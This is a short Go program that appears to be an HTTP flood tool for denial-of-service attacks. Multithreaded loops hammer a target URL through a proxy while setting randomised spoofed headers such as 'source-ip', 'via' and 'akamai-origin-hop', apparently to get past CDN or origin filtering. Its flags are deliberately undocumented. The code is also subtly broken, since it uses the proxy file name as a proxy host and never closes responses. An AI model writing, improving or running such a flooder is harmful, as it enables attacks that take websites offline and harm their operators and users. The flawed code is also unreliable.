package main

import (
	"fmt"
	"flag"
	"net/http"
	url2 "net/url"
	"time"
	"strings"
	"math/rand"
)

type headersFlag []string

func (h *headersFlag) String() string {
    return fmt.Sprintf("%v", *h)
}

func (h *headersFlag) Set(value string) error {
    *h = append(*h, value)
    return nil
}

var start = make(chan bool)

func main() {
	var requests int
	var timeSeconds int
	var threads int
	var proxyFile string
	var urlStr string
	var headers headersFlag

	flag.IntVar(&requests, "r", 64, ".")
	flag.IntVar(&timeSeconds, "d", 0, ".")
	flag.IntVar(&threads, "t", 1, ".")
	flag.StringVar(&proxyFile, "p", "proxy.txt", ".")
	flag.StringVar(&urlStr, "u", "", ".")
	flag.Var(&headers, "h", ".")

	flag.Parse()

	headersMap := make(map[string]string)
	for _, header := range headers {
		parts := strings.SplitN(header, "@", 2)
		if len(parts) == 2 {
			headersMap[parts[0]] = parts[1]
		}
	}

	randomHeaders := map[string][]string{
		"source-ip":        {"a", "b", "c", "d"},
		"via":              {"e", "f", "g", "h"},
		"cluster-ip":       {"i", "j", "k", "l"},
		"akamai-origin-hop": {"m", "n", "o", "p"},
	}

	for x := 0; x < threads; x++ {
		go func(threadNum int) {
			target, err := url2.Parse(fmt.Sprintf("http://%s", proxyFile))

			Http2ProxyConfig := &http.Transport{
				Proxy: http.ProxyURL(target),
			}

			client := &http.Client{
				Timeout:   time.Duration(10000) * time.Millisecond,
				Transport: Http2ProxyConfig,
			}
			req, err := http.NewRequest("GET", urlStr, nil)
			if err != nil {
				return
			}

			<-start
			for range time.Tick(time.Millisecond * time.Duration(requests)) {
				randomHeader := getRandomHeader(randomHeaders)
				value := getRandomHeaderValue(randomHeaders[randomHeader])

				req.Header.Set(randomHeader, value)

				for key, value := range headersMap {
					req.Header.Set(key, value)
				}

				resp, err := client.Do(req)
				if err != nil {
					continue
				}

				time.Sleep(1 * time.Second)

				if resp.StatusCode == 403 {
					break
				}
			}
		}(x)
	}

	close(start)
	time.Sleep(time.Duration(timeSeconds) * time.Second)
}

func getRandomHeader(headers map[string][]string) string {
	rand.Seed(time.Now().UnixNano())
	keys := make([]string, 0, len(headers))
	for k := range headers {
		keys = append(keys, k)
	}
	randomIndex := rand.Intn(len(keys))
	return keys[randomIndex]
}

func getRandomHeaderValue(values []string) string {
	rand.Seed(time.Now().UnixNano())
	randomIndex := rand.Intn(len(values))
	return values[randomIndex]
}
